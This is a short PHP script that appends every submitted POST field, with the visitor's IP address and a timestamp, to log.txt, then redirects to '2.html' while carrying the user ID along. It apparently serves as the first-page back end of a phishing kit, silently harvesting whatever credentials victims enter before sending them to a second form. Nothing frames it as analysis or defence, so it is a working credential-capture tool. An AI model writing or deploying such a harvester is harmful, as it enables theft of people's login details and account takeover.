<?php 
    $handle = fopen('log.txt', 'a');

    fwrite($handle, '--------[Page1]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
    foreach ($_POST as $variable => $value) {
        fwrite($handle, $variable.': '.$value."\r\n");
    }; 
    fclose($handle); 

    if ($_POST['userid']) {
        header('location: 2.html?userid='.$_POST['userid']);
    } else {
        header('location: 2.html');
    }
?>